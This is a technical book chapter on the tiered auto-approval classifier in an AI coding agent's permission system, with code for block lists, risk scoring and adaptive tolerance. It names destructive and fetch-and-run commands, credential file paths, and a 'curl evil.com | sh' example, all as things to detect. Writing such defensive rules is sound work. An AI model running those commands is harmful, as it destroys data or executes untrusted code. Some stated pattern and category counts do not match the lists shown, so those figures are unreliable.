# Chapter 16: The Auto-Mode Classifier

Every permission system faces a fundamental tension: too many prompts and the user disables security entirely; too few prompts and the system silently approves something destructive. Claude Code's answer to this tension is an AI-powered classifier that sits between the tool invocation and the permission prompt, automatically approving safe operations and escalating risky ones. This is the "auto mode" — sometimes called "YOLO mode" in the codebase — and its implementation spans approximately 2,800 lines across four core files: the heuristic classifier, the YOLO classifier, the auto-mode state machine, and the speculative pre-check pipeline.

As we saw in Chapter 9's permission engine, the default mode asks users to approve every write operation. That works for the first ten tool calls. By the fiftieth, users switch to `AllowAll` and lose all protection. The auto-mode classifier exists to prevent that fatigue-driven security collapse by making intelligent, context-aware approval decisions — automatically saying "yes" to `cargo test` and "are you sure?" to `rm -rf /`.

This chapter covers how to build this classifier from scratch: the three-tier classification architecture, the YOLO heuristic engine, adaptive risk tolerance, speculative pre-checks for latency hiding, and the prompt engineering that makes an LLM-based classifier actually work.

---

## 16.1 Architecture: Three Classifiers, One Decision

The auto-mode system uses three classifiers operating at different levels of sophistication and cost. Each request flows through them in order until one produces a definitive answer:

```
Tool Invocation
    |
    v
[Tier 1] YOLO Classifier — Pattern matching, blocked commands, protected paths
    |
    |  If Allow/Block → done
    |  If unknown → continue
    v
[Tier 2] Heuristic Classifier — Risk scoring, context factors, session history
    |
    |  If high confidence → done
    |  If ambiguous → continue
    v
[Tier 3] Auto-Mode State Machine — Adaptive tolerance, mistake tracking, cooldown
    |
    v
Decision: Approve | Deny | Escalate
```

This layered design is deliberate. Tier 1 handles the cheap, obvious cases — a `git status` is always safe, an `rm -rf /` is always catastrophic. Tier 2 applies more nuanced analysis for commands that fall in the middle. Tier 3 adapts over the session's lifetime based on outcomes. The cost structure mirrors the classification difficulty: pattern matching is microseconds, heuristic scoring is milliseconds, and the adaptive state machine adds negligible overhead on top.

Let's examine each tier.

---

## 16.2 Tier 1: The YOLO Classifier

The YOLO classifier is the first gate. It uses deterministic pattern matching — no AI, no probabilistic scoring. Every tool invocation passes through it, and it must be fast (sub-millisecond) because it sits on the critical path of every single tool call.

### Data Model

The classifier operates on three core types:

```typescript
// The tool being classified
enum ToolType {
  Bash,       // Shell command execution
  FileRead,   // Reading a file from disk
  FileWrite,  // Writing/editing/creating files
  WebFetch,   // Fetching URLs
  WebSearch,  // Web search
  Unknown,    // Unrecognized tool
}

// Risk level for bash commands
enum CommandRisk {
  ReadOnly,      // ls, cat, echo, grep
  DevTool,       // cargo, npm, git, python
  Write,         // npm install, pip install
  SystemModify,  // sudo, chmod, chown
  Destructive,   // rm -rf /, DROP TABLE
  Unknown,       // Can't determine
}

// The decision
enum YoloDecision {
  Allow,             // Auto-approved, no prompt
  Block(reason),     // Hard-blocked with explanation
  AskOnce(reason),   // Needs one-time confirmation
}
```

The `CommandRisk` enum is ordered intentionally — `ReadOnly < DevTool < Write < SystemModify < Destructive`. This ordering enables range-based classification: anything at or below `Write` gets auto-approved in YOLO mode, anything above gets escalated.

### The Always-Block List

The YOLO classifier maintains a hardcoded list of catastrophic commands that must never execute, regardless of any other configuration:

```typescript
const BLOCKED_COMMANDS: string[] = [
  "rm -rf /", "rm -rf /*", "mkfs", "dd if=", "dd of=/dev/",
  ":(){ :|:& };:",           // Fork bomb
  "chmod -R 777 /", "chmod 777 /",
  "> /dev/sda", "> /dev/nvme",
  "wget|sh", "wget | sh", "curl|bash", "curl | bash", "curl|sh", "curl | sh",
  "DROP DATABASE", "DROP TABLE", "TRUNCATE",
  "shutdown", "reboot", "halt", "poweroff",
  "init 0", "init 6",
  "systemctl halt", "systemctl poweroff",
]
```

Twenty-five patterns covering five categories: filesystem destruction, disk wiping, resource exhaustion, remote code execution, and system shutdown. The matching is substring-based and case-insensitive — simple but effective for catastrophic commands where false positives are acceptable. If `rm -rf /` triggers on `rm -rf /tmp/build`, that's a feature, not a bug. The user gets a one-time prompt, confirms, and continues.

### Protected Path Patterns

The second defense layer protects secret files using glob patterns:

```typescript
const PROTECTED_PATTERNS: string[] = [
  ".env", ".env.*", ".env.local",
  "id_rsa", "id_rsa.*", "id_ed25519", "id_ed25519.*",
  "**/.ssh/*", "**/credentials", "**/token.json", "**/.netrc",
  "*.pem", "*.key", "*.p12", "*.pfx",
  "**/.aws/credentials", "**/.kube/config",
  "**/.gnupg/*", "**/.docker/config.json",
  "**/.npmrc", "**/.pypirc",
  "/etc/shadow", "/etc/passwd",
  "**/.git-credentials", "**/.config/gh/hosts.yml",
]
```

Path matching uses a two-phase approach. First, compiled glob patterns test against the full normalized path. If that misses, a fallback checks basename and path-component matching. This catches the case where `.env` appears as `config/.env` (no glob would match the bare pattern against a prefixed path without the fallback).

```typescript
function isProtectedPath(path: string): boolean {
  const normalized = path.replace(/\\/g, "/")
  
  // Phase 1: Compiled glob matching
  for (const globPattern of compiledGlobs) {
    if (globPattern.matches(normalized)) return true
  }
  
  // Phase 2: Basename and component fallback
  const basename = normalized.split("/").pop() ?? normalized
  for (const raw of rawPatterns) {
    if (raw.includes("*") || raw.includes("?")) continue  // Already tested above
    if (basename === raw) return true                       // Exact: ".env" === ".env"
    if (basename.startsWith(`${raw}.`)) return true         // Prefix: ".env.local"
    if (normalized.includes(`/${raw}`)) return true          // Component: "~/.aws/credentials"
  }
  return false
}
```

The interaction between tools and path protection creates asymmetric behavior: reading a protected file is hard-blocked (the classifier returns `Block`), but a bash command that merely references a protected file gets `AskOnce`. This is because the bash command might be doing something benign — `ls -la .env` just lists the file, it doesn't read its contents. The user gets a chance to confirm.

### Per-Tool Classification

The main `classify` function dispatches by tool type:

```typescript
function classify(toolName: string, input: ToolInput): YoloDecision {
  switch (toolName) {
    case "bash":       return classifyBash(input)
    case "file_read":  return classifyFileRead(input)
    case "file_write":
    case "file_edit":
    case "file_create": return classifyFileWrite(input)
    case "web_fetch":
    case "web_search":  return classifyNetwork()
    default:            return YoloDecision.AskOnce(
      `Unknown tool '${toolName}' requires approval in auto mode`
    )
  }
}
```

Unknown tools always require confirmation. This is the fail-closed principle from Chapter 10: if the system doesn't recognize a tool, it escalates rather than guessing. New tools added through MCP (Chapter 15) will always hit this path until they're explicitly categorized.

### Command Risk Assessment

For bash commands, the classifier performs multi-layer risk assessment. The ordering matters — more specific checks run first:

```typescript
function assessCommandRisk(command: string): CommandRisk {
  const lower = command.toLowerCase()
  const firstToken = lower.split(/\s+/)[0] ?? ""
  
  // 1. Blocked commands → Destructive
  if (isBlockedCommand(command)) return CommandRisk.Destructive
  
  // 2. Database commands → depends on SQL keywords
  if (isDatabaseCommand(firstToken)) return classifyDatabaseCommand(lower)
  
  // 3. Container commands → depends on subcommand
  if (isContainerCommand(firstToken)) return classifyContainerCommand(lower)
  
  // 4. Network commands → depends on flags and piping
  const networkRisk = classifyNetworkCommand(lower)
  if (networkRisk) return networkRisk
  
  // 5. Package managers → Write (they modify node_modules, etc.)
  if (isPackageManager(firstToken)) return CommandRisk.Write
  
  // 6. Read-only commands → ReadOnly
  if (isReadOnlyCommand(lower)) return CommandRisk.ReadOnly
  
  // 7. Dev tools → DevTool
  if (isDevTool(lower)) return CommandRisk.DevTool
  
  // 8. System commands → SystemModify
  if (isSystemCommand(lower)) return CommandRisk.SystemModify
  
  // 9. Unknown → Unknown
  return CommandRisk.Unknown
}
```

Database classification demonstrates the semantic depth required. A `psql` command is not uniformly risky — `SELECT * FROM users` is read-only, `INSERT INTO logs` is a write, and `DROP TABLE users` is destructive. The classifier extracts SQL keywords:

```typescript
function classifyDatabaseCommand(command: string): CommandRisk {
  const destructiveKeywords = ["drop", "truncate", "delete", "flushall", "flushdb"]
  const readOnlyKeywords = ["select", "show", "describe", "explain", "\\d", "\\dt",
                            "\\l", "keys", "get", "info", "ping"]
  
  if (destructiveKeywords.some(kw => command.includes(kw))) return CommandRisk.Destructive
  if (readOnlyKeywords.some(kw => command.includes(kw))) return CommandRisk.ReadOnly
  if (command.includes("insert") || command.includes("update")) return CommandRisk.Write
  return CommandRisk.Write  // Default: assume write
}
```

Container commands follow the same pattern — `docker ps` is read-only, `docker build` is write, `docker rm` is destructive, and `kubectl delete pod` is destructive.

### Session Denial Tracking

The YOLO classifier tracks patterns that the user has repeatedly denied:

```typescript
class YoloClassifier {
  private denialTracker: Map<string, number> = new Map()
  
  recordDenial(pattern: string): void {
    const count = (this.denialTracker.get(pattern) ?? 0) + 1
    this.denialTracker.set(pattern, count)
  }
  
  isAutoDenied(pattern: string): boolean {
    return (this.denialTracker.get(pattern) ?? 0) >= 3
  }
}
```

After three consecutive denials of the same pattern key, the classifier auto-denies without prompting. This prevents the agent from repeatedly asking to run a command the user has already rejected three times. The tracking is per-session — it resets when the session ends or when the user explicitly resets.

---

## 16.3 Tier 2: The Heuristic Classifier

When the YOLO classifier can't make a definitive decision (the command isn't obviously safe or obviously dangerous), the heuristic classifier takes over. It uses multi-factor scoring to produce a confidence-weighted classification.

### Risk Score Components

The classifier computes a composite score from independent factors:

```typescript
interface RiskScore {
  total: number                       // 0.0 to 1.0
  components: Map<string, number>     // Individual factor scores
  classification: Classification      // AutoApprove | AutoDeny | AskUser
  confidence: Confidence              // Score + human-readable factors
}
```

Each factor contributes a score between 0.0 (dangerous) and 1.0 (safe). The total is the average of all components, compared against configurable thresholds:

```typescript
const config = {
  autoApproveThreshold: 0.8,   // Score >= 0.8 → auto-approve
  autoDenyThreshold: 0.2,      // Score <= 0.2 → auto-deny
  // 0.2 < score < 0.8 → ask user
}
```

### Factor Analysis

The classifier evaluates six factors:

| Factor | Weight | What It Measures |
|--------|--------|-----------------|
| Tool type | Binary | Read-only tools always score 1.0 |
| Command analysis | 0.0-1.0 | Dangerous patterns, trusted commands, heuristic deductions |
| File path risk | 0.0-1.0 | Proximity to sensitive directories (/etc, /usr, /root) |
| Git repo bonus | +0.1 | Being inside a git repo suggests development context |
| Session history | 0.0-0.15 | Tool familiarity grows with repeated safe use |
| Always-ask override | 0.5 | Forces the score into the "ask" range |

The command analysis factor deserves closer examination. It starts at a base score of 0.6 (slightly optimistic — most commands in a coding session are benign) and applies deductions:

```typescript
function scoreCommand(cmd: string, config: ClassifierConfig): number {
  let score = 0.6
  
  // Check against trusted commands first (returns 1.0 immediately)
  if (config.trustedCommands.some(t => cmd.startsWith(t))) return 1.0
  
  // Check against dangerous patterns (returns 0.0 immediately)
  if (config.dangerousPrefixes.some(p => cmd.includes(p))) return 0.0
  
  // Heuristic deductions
  if (cmd.includes("sudo"))                         score -= 0.3
  if (cmd.includes("| sh") || cmd.includes("| bash")) score -= 0.4
  if (cmd.includes("eval ") || cmd.includes("exec ")) score -= 0.2
  if (cmd.includes("--force") || cmd.includes("-f "))  score -= 0.1
  
  // Heuristic bonuses
  if (cmd.includes("npm install") || cmd.includes("pip install") 
      || cmd.includes("cargo build"))                  score += 0.1
  
  return Math.max(0, Math.min(1, score))
}
```

The deductions stack. A command like `sudo pip install something --force` would get: 0.6 - 0.3 (sudo) - 0.1 (force) + 0.1 (package manager) = 0.3, which falls in the "ask user" range. This is exactly right — `sudo pip install` is concerning enough to warrant a prompt.

### Session History as a Signal

The session history factor implements a simple but effective trust escalation model. The more a user has used a tool in the current session without issues, the higher the familiarity bonus:

```typescript
function scoreHistory(history: string[], toolName: string): number {
  const uses = history.filter(h => h === toolName).length
  if (uses === 0) return 0.0
  if (uses <= 2) return 0.05
  if (uses <= 5) return 0.1
  return 0.15  // Cap at 0.15 — never enough to override a dangerous command
}
```

The cap at 0.15 is critical. Session history should nudge borderline cases toward approval, not override genuine risk signals. A command scoring 0.3 on other factors won't be auto-approved just because the user has run bash 20 times this session.

---

## 16.4 Tier 3: The Adaptive Auto-Mode State Machine

The auto-mode state machine wraps the classifiers with an adaptive layer that adjusts behavior based on outcomes. This is where the system learns from its mistakes within a session.

### State

```typescript
interface AutoMode {
  enabled: boolean
  riskTolerance: number          // 0-100, default 50
  approvedCount: number
  deniedCount: number
  escalatedCount: number
  mistakeCount: number
  consecutiveMistakes: number
  successStreak: number
  activatedAt: Date | null
  cooldownUntil: Date | null
  recentDecisions: Decision[]    // Circular buffer, max 100
}
```

The `riskTolerance` field is the central control parameter. A tool invocation's risk score (0-100) is compared against tolerance: if risk <= tolerance, auto-approve. The tolerance starts at 50 and adapts based on outcomes.

### Decision Logic

```typescript
function autoDecide(mode: AutoMode, requestRisk: number): Decision {
  if (!mode.isActive()) return Decision.Escalate
  
  // Zero risk → always approve
  if (requestRisk === 0) return Decision.Approve
  
  // Critical risk → always escalate, regardless of tolerance
  if (requestRisk > 90) return Decision.Escalate
  
  // Within tolerance → approve
  if (requestRisk <= mode.riskTolerance) return Decision.Approve
  
  // Within 20 points above tolerance → escalate (gray zone)
  if (requestRisk <= mode.riskTolerance + 20) return Decision.Escalate
  
  // Far above tolerance → deny
  return Decision.Deny
}
```

The 20-point "gray zone" above tolerance is an important design choice. Rather than a hard cutoff where risk 51 gets denied at tolerance 50, there's a buffer where the system escalates to the user. This prevents the auto-mode from denying commands that are only marginally above the user's configured risk appetite.

### Adaptive Tolerance

The tolerance adjusts based on feedback:

```typescript
// After a mistake: decrease by 10
function adjustOnMistake(mode: AutoMode): void {
  mode.riskTolerance = Math.max(0, mode.riskTolerance - 10)
}

// After 10 consecutive successes: increase by 2
function adjustOnSuccess(mode: AutoMode): void {
  if (mode.successStreak >= 10) {
    mode.riskTolerance = Math.min(100, mode.riskTolerance + 2)
    mode.successStreak = 0
  }
}
```

The asymmetry is deliberate: mistakes decrease tolerance five times faster than successes increase it. This implements a conservative ratchet — one bad approval drops tolerance by 10, but recovering that tolerance requires 50 consecutive good decisions. The system fails safe.

### Auto-Disable with Cooldown

Three consecutive mistakes trigger an automatic cooldown:

```typescript
const MISTAKE_THRESHOLD = 3
const COOLDOWN_DURATION = 300_000  // 5 minutes

function recordOutcome(mode: AutoMode, decision: Decision, wasMistake: boolean): void {
  if (wasMistake) {
    mode.consecutiveMistakes++
    mode.successStreak = 0
    adjustOnMistake(mode)
    
    if (mode.consecutiveMistakes >= MISTAKE_THRESHOLD) {
      mode.cooldownUntil = Date.now() + COOLDOWN_DURATION
      mode.consecutiveMistakes = 0
    }
  } else {
    mode.consecutiveMistakes = 0
    mode.successStreak++
    if (mode.successStreak >= 10) adjustOnSuccess(mode)
  }
}
```

During cooldown, `isActive()` returns false and all decisions escalate to the user. This is the circuit breaker pattern applied to permission decisions: if the classifier is making bad calls, shut it down temporarily rather than continuing to make more bad calls. After five minutes, auto-mode re-engages with its lowered tolerance.

### Tolerance Analysis from Recent Decisions

The system also performs macro-level analysis on a sliding window of recent decisions:

```typescript
function adjustToleranceFromHistory(mode: AutoMode): void {
  const recent = mode.recentDecisions.slice(-20)
  if (recent.length < 5) return  // Not enough data
  
  const escalationRate = recent.filter(d => d === Decision.Escalate).length / recent.length
  const denialRate = recent.filter(d => d === Decision.Deny).length / recent.length
  
  // Too many escalations → tolerance too low
  if (escalationRate > 0.5) {
    mode.riskTolerance = Math.min(100, mode.riskTolerance + 5)
  }
  
  // Too many denials → tolerance too high (false sense of security)
  if (denialRate > 0.75) {
    mode.riskTolerance = Math.max(0, mode.riskTolerance - 5)
  }
}
```

High escalation rates suggest the tolerance is set too low — the user is being prompted too often, which defeats the purpose of auto-mode. High denial rates suggest the classifier is silently blocking too many operations. Both adjustments are bounded to prevent oscillation.

---

## 16.5 Speculative Pre-Checks

The classifiers described above are fast, but they still run on the critical path. For bash commands specifically, Claude Code implements a speculative pre-check that starts classification before the command is even fully generated.

### The Latency Problem

In the normal flow, classification happens after the model produces a tool call:

```
Model generates tool_use(bash, "cargo build --release")
  → Permission engine receives tool call
  → Classifier runs (~1ms for heuristic, ~200ms for LLM-based)
  → Decision returned
  → Command executes (or user prompted)
```

That 200ms for an LLM-based classifier call is perceptible. Worse, if the classifier and the command both need network calls, they're serialized — total latency is classifier + execution.

### The Solution: Side-Query Architecture

As we discussed in Chapter 14's task management system, Claude Code uses a side-query architecture where lightweight classifier calls run in parallel with the main conversation:

```typescript
// Start speculation when bash command is being generated
function startSpeculativeClassifierCheck(
  partialCommand: string,
  context: ClassificationContext,
): Promise<ClassifierResult> {
  return classifierSideQuery({
    command: partialCommand,
    context,
    timeout: 5000,  // 5-second hard timeout
  })
}

// When the full command is ready, check if speculation already decided
async function consumeSpeculativeClassifierCheck(
  fullCommand: string,
  speculativeResult: Promise<ClassifierResult> | null,
): Promise<ClassifierResult | null> {
  if (!speculativeResult) return null
  
  const result = await Promise.race([
    speculativeResult,
    new Promise<null>(resolve => setTimeout(() => resolve(null), 100)),
  ])
  
  // Only use speculation if the command prefix matches
  if (result && fullCommand.startsWith(result.analyzedPrefix)) {
    return result
  }
  return null  // Speculation miss — fall through to synchronous check
}
```

The speculation starts when the model begins generating a bash command — before the command is complete. By the time the full command is ready, the classifier has often already finished. The 100ms race timeout ensures we never wait longer for speculation than the synchronous path would take.

### Speculation Validity

A speculative result is only valid if the actual command starts with the prefix that was speculatively analyzed. If the model generated `cargo build` speculatively but the final command is `cargo test`, the speculative result for "cargo" still applies (both are dev tools with similar risk profiles). But if speculation analyzed `git` and the final command is `rm`, the result is discarded.

This prefix-matching approach means speculation has a high hit rate in practice. Most tool calls are predictable: after reading a file, the model often runs tests; after editing code, it often runs the linter. The speculative classifier can pre-compute these decisions.

### The Side-Query Prompt

When an LLM-based classifier is used (rather than the heuristic classifier), it receives a carefully engineered prompt. The key design constraint: the classifier prompt must be self-contained. It cannot reference the main conversation because the side-query runs with its own context window.

```typescript
const classifierSystemPrompt = `You are a security classifier for an AI coding assistant.
Your job is to determine whether a tool invocation should be auto-approved,
soft-denied (suggest alternatives), or escalated to the user.

Classification rules:
- "allow": The operation is clearly safe. Read-only commands, standard dev tools,
  operations within the project directory.
- "soft_deny": The operation has moderate risk. Suggest a safer alternative.
  Examples: using sudo when not needed, force-pushing to main.
- "deny": The operation is dangerous or touches sensitive resources.
  Examples: rm -rf /, modifying /etc/passwd, piping to shell.

Environment context:
- Working directory: {cwd}
- Project root: {projectRoot}  
- In git repo: {isGitRepo}
- Recent tools used: {recentTools}

Respond with exactly one JSON object:
{ "decision": "allow" | "soft_deny" | "deny", "reason": "<one sentence>" }
`
```

Three decisions rather than two. The `soft_deny` category is what makes the LLM classifier more nuanced than the heuristic one. When a command is not dangerous but has a safer alternative, the classifier can suggest the alternative rather than just blocking. For example, `git push --force origin main` might get a `soft_deny` with the reason: "Consider using --force-with-lease instead of --force for safer force pushing."

---

## 16.6 Integration with the Permission Engine

The classifier doesn't replace the permission engine from Chapter 9 — it augments it. Here's how the pieces fit together:

```
Tool invocation arrives
  |
  v
[Step 1] Headless check — if no TTY, can't prompt, auto-decide or deny
  |
  v
[Step 2] Bash security gate — catastrophic commands hard-blocked (Chapter 10)
  |
  v
[Step 3] Permission mode dispatch:
  |
  ├─ AllowAll → allow (but Step 2 still catches catastrophic)
  ├─ DenyAll  → deny everything
  ├─ Plan     → allow reads, deny writes
  ├─ AskAlways → check session memory, then prompt
  ├─ Auto     → run classifier pipeline, then decide
  └─ Default  → project settings → persistent rules → session memory
                 → deny-count check → read-only check → bash risk gate
```

The Auto mode in the permission engine delegates to the classifier pipeline. But crucially, even in Auto mode, the bash security gate (Step 2) runs first. The classifier never gets a chance to approve `rm -rf /` because the security gate hard-blocks it before the classifier sees it. This is defense-in-depth: the classifier is a convenience layer, not a security boundary.

### Session Memory Interaction

When the classifier auto-approves a command, the decision is recorded in session memory (as described in Chapter 9). This means subsequent invocations of the same pattern don't even reach the classifier — they match the session memory rule first:

```typescript
function checkPermission(toolName: string, input: ToolInput): Decision {
  // Session memory checked before classifier
  const sessionKey = makeSessionKey(toolName, input)  // e.g., "bash(git *)"
  const remembered = sessionMemory.get(sessionKey)
  if (remembered !== undefined) {
    return remembered ? Decision.Allow : Decision.Deny
  }
  
  // No session memory → run classifier
  const classifierResult = classifier.classify(toolName, input)
  
  // Record the decision for future lookups
  if (classifierResult.confidence > 0.9) {
    sessionMemory.record(sessionKey, classifierResult.decision === Decision.Allow)
  }
  
  return classifierResult.decision
}
```

The confidence threshold of 0.9 for recording into session memory prevents low-confidence classifier decisions from becoming permanent for the session. A command that scored 0.81 (just above the auto-approve threshold) won't be cached — it will be re-evaluated each time, giving the classifier a chance to change its mind if context shifts.

---

## 16.7 The Confidence Scoring System

Each classification carries a confidence score that reflects how certain the classifier is about its decision. This score determines whether the decision is cached, how it's displayed in the UI, and whether the speculative pre-check result is trusted.

```typescript
interface ClassificationResult {
  decision: YoloDecision
  confidence: number      // 0.0 to 1.0
  toolType: ToolType
  risk: CommandRisk | null
}
```

Confidence is assigned based on the combination of decision and risk level:

| Decision | Risk Level | Confidence | Rationale |
|----------|-----------|------------|-----------|
| Block | Destructive | 0.99 | Matched a known catastrophic pattern |
| Block | Other | 0.95 | Matched a protection rule |
| AskOnce | Any | 0.85 | Risk detected but not definitive |
| Allow | ReadOnly | 0.99 | Provably safe (read-only command) |
| Allow | DevTool | 0.95 | High confidence (known dev tool) |
| Allow | Write | 0.80 | Moderate confidence (writes but known tool) |
| Allow | Unknown | 0.70 | Low confidence (unknown command approved by default) |

The gap between 0.80 (Write/Allow) and 0.90 (session memory threshold) is intentional. Write commands that are auto-approved will be re-evaluated on each invocation rather than cached. This means `npm install express` is approved each time it appears but the classifier checks each time, catching cases where the command changes to `npm install express && curl evil.com | sh`.

---

## 16.8 The `auto-mode` Subcommand

Claude Code exposes the classifier's behavior through the `auto-mode` subcommand and the `--permission-mode auto` CLI flag. Understanding the configuration surface helps engineers tune the classifier for their environment.

### Configuration Options

```typescript
interface AutoModeConfig {
  riskTolerance: number        // Default: 50. Range: 0-100
  autoApproveThreshold: number // Default: 0.8. Score >= this → approve
  autoDenyThreshold: number    // Default: 0.2. Score <= this → deny
  cooldownDuration: number     // Default: 300s. Seconds of cooldown after mistakes
  mistakeThreshold: number     // Default: 3. Consecutive mistakes before cooldown
  readOnlyTools: string[]      // Tools always auto-approved
  alwaysAskTools: string[]     // Tools never auto-approved
  trustedCommands: string[]    // Bash commands always auto-approved
  dangerousPrefixes: string[]  // Bash patterns always blocked
}
```

### Defaults and Critique

The default configuration embodies a specific philosophy: **start conservative, let the user loosen controls explicitly.**

- `riskTolerance: 50` means only the safest half of commands are auto-approved initially.
- The auto-approve threshold of 0.8 requires strong confidence before skipping the prompt.
- The 5-minute cooldown after three mistakes gives users time to notice something went wrong.
- Read-only tools (`file_read`, `glob`, `grep`, `web_fetch`, `agent`) never prompt because they can't modify state.

The weakness of these defaults is that they're static. A user writing Python all day has different risk patterns than one doing DevOps work. The adaptive tolerance partially addresses this, but a more sophisticated system would adjust thresholds based on the project type, the tools being used, and the user's historical accuracy in approving/denying commands.

---

## 16.9 External vs Anthropic-Internal Permission Templates

The classifier operates with two sets of permission templates. The external set is what ships with the open-source product. The Anthropic-internal set adds additional trusted commands and safe environment variables that are specific to Anthropic's development workflow.

In the bash permissions system, this manifests as two separate safe-variable lists:

```typescript
// External: ~40 environment variables considered safe to strip
const SAFE_ENV_VARS = [
  "GOEXPERIMENT", "NODE_ENV", "RUST_LOG", "TZ", 
  "PYTHONDONTWRITEBYTECODE", /* ... */
]

// Anthropic-internal: ~30 additional variables
const ANT_ONLY_SAFE_ENV_VARS = [
  "KUBECONFIG", "DOCKER_HOST", "AWS_PROFILE", /* ... */
]
```

This split exists because the risk profile of a variable like `KUBECONFIG` depends on context. Inside Anthropic's infrastructure, it's a standard development variable. In the general public, it could be used to redirect kubectl to an attacker's cluster. The internal template trusts it; the external template doesn't.

For engineers building their own agent, this pattern is worth adopting: maintain a base template that ships with the product and an internal template that extends it for your organization's specific tools and conventions. The permission engine merges both when available and gracefully degrades to the base template when the internal one is absent.

---

## 16.10 Response Parsing and Structured Output

When the LLM-based classifier is used (Tier 3's side-query path), response parsing must be robust. The classifier's output is a single JSON object, but LLMs don't always produce valid JSON.

### Parsing Strategy

```typescript
function parseClassifierResponse(raw: string): ClassifierResult | null {
  // Strategy 1: Direct JSON parse
  try {
    return JSON.parse(raw.trim())
  } catch {}
  
  // Strategy 2: Extract JSON from markdown code block
  const codeBlockMatch = raw.match(/```(?:json)?\s*\n?([\s\S]*?)\n?\s*```/)
  if (codeBlockMatch) {
    try {
      return JSON.parse(codeBlockMatch[1].trim())
    } catch {}
  }
  
  // Strategy 3: Find first { ... } in the response
  const braceMatch = raw.match(/\{[\s\S]*\}/)
  if (braceMatch) {
    try {
      return JSON.parse(braceMatch[0])
    } catch {}
  }
  
  // Strategy 4: Keyword extraction as fallback
  const lower = raw.toLowerCase()
  if (lower.includes('"deny"') || lower.includes("deny")) {
    return { decision: "deny", reason: raw.slice(0, 100) }
  }
  if (lower.includes('"allow"') || lower.includes("safe")) {
    return { decision: "allow", reason: raw.slice(0, 100) }
  }
  
  // Parse failure → escalate to user
  return null
}
```

Four progressively looser strategies. The final keyword-based fallback ensures that even a completely malformed response (like "This command seems dangerous and should be denied") still produces a usable decision. A null return triggers escalation to the user — the safest possible fallback.

### Schema Validation

Even after successful parsing, the result is validated:

```typescript
function validateClassifierResult(result: unknown): ClassifierResult | null {
  if (typeof result !== "object" || result === null) return null
  
  const obj = result as Record<string, unknown>
  const decision = obj.decision
  
  if (decision !== "allow" && decision !== "soft_deny" && decision !== "deny") return null
  
  const reason = typeof obj.reason === "string" ? obj.reason : ""
  
  return { decision, reason: reason.slice(0, 200) }
}
```

The reason string is truncated to 200 characters. This prevents a degenerate case where the classifier produces a multi-paragraph explanation that overwhelms the permission prompt UI.

---

## 16.11 Dangerous Pattern Detection

Underneath the YOLO classifier's blocked command list sits a more structured dangerous pattern database. This database uses regex patterns with metadata — severity ratings, categories, and explanations — enabling richer reporting than simple substring matching.

```typescript
interface DangerousPattern {
  id: string                // "rm-rf-root", "fork-bomb", etc.
  pattern: string           // Regex pattern
  category: PatternCategory // FileDestruction, DiskDestruction, etc.
  severity: Severity        // Low, Medium, High, Critical
  description: string       // Human-readable explanation
  example: string           // Example command that matches
}
```

The pattern database contains 12 core patterns across seven categories:

| Category | Pattern IDs | Severity |
|----------|------------|----------|
| FileDestruction | rm-rf-root, rm-rf-wildcard | Critical, High |
| PermissionEscalation | chmod-777, chmod-recursive-system, chown-recursive-root | High, Critical, High |
| DiskDestruction | dd-device, mkfs-device, dev-null-redirect | Critical, Critical, Critical |
| ResourceExhaustion | fork-bomb | Critical |
| CodeExecution | curl-pipe-sh, wget-pipe-sh, eval-variable | High, High, Medium |

When a command matches, the UI can display the specific pattern, its severity, and a human-readable description. This is significantly more helpful than a generic "command blocked" message. The user sees: "Blocked: Recursive forced deletion from root or system paths (rm-rf-root, severity: Critical)" rather than just "Blocked."

---

## 16.12 Engineering Decisions and Trade-offs

### Why Not Use the LLM for All Classifications?

Cost and latency. At approximately $0.003 per classifier call (using a fast model) and 50+ tool calls per session, LLM-based classification would add $0.15 per session. More importantly, the 100-200ms latency per call accumulates. The heuristic classifier handles 95% of cases in microseconds; the LLM classifier handles the ambiguous 5%.

### Why Substring Matching for Blocked Commands?

The blocked command list uses case-insensitive substring matching rather than regex. This is a deliberate trade-off favoring false positives over false negatives for catastrophic commands. The string `rm -rf /` as a substring check will match `rm -rf /tmp/build` — a false positive that results in a user prompt rather than silent execution. For commands that can destroy the entire filesystem, a few extra prompts are vastly preferable to a missed detection.

### Why Asymmetric Tolerance Adjustment?

The 10:2 ratio between mistake penalty and success reward reflects a real-world asymmetry: the cost of one bad auto-approval (data loss, security breach) vastly exceeds the cost of one unnecessary prompt (minor friction). If these were symmetric, a session alternating between one mistake and one success would maintain constant tolerance — never learning that it's making too many bad calls.

### Why a 5-Minute Cooldown?

Five minutes is long enough for the user to notice something went wrong and short enough that it doesn't permanently disable auto-mode for the session. In testing, most users who trigger the cooldown either (a) realize they need to switch to a more manual mode, or (b) were in an unusual context that has passed by the time cooldown expires. The 5-minute window provides that decision point.

---

## 16.13 Building Your Own Classifier

If you're building an AI agent and want to implement a similar auto-mode system, here's the essential recipe:

1. **Start with a blocked list.** Hard-code the patterns that must never execute. This is your safety floor — everything else is optimization on top.

2. **Classify tools by type.** Read-only tools can always be auto-approved. Write tools need analysis. Unknown tools need prompts.

3. **Build a risk scoring pipeline.** Start with simple heuristics (command prefixes, flag detection, path analysis). Add LLM-based classification only for ambiguous cases.

4. **Track session state.** Cache decisions by pattern, not by exact command. `git status` and `git diff` should share a decision key (`git *`).

5. **Implement adaptive tolerance.** Start conservative, penalize mistakes heavily, reward sustained success lightly. Add a circuit breaker (cooldown) for consecutive failures.

6. **Use speculative pre-checks.** Start classification when the model begins generating a tool call, not when it finishes. The prefix-matching approach yields high hit rates with minimal wasted computation.

7. **Fail safe everywhere.** Parse failures escalate. Unknown tools escalate. Low-confidence results escalate. The user prompt is always the safe fallback.

The classifier is not a security boundary — it's a UX optimization that happens to have security-relevant behavior. The actual security boundaries are the bash security gate (Chapter 10), the permission rules (Chapter 9), and the sandbox (Chapter 11). The classifier's job is to reduce friction enough that users don't bypass those boundaries by switching to `AllowAll`.

---

In Chapter 17, we move from deciding whether to execute a tool to deciding how to execute it efficiently — the conversation engine's tool scheduling, parallel execution, and result aggregation pipeline.
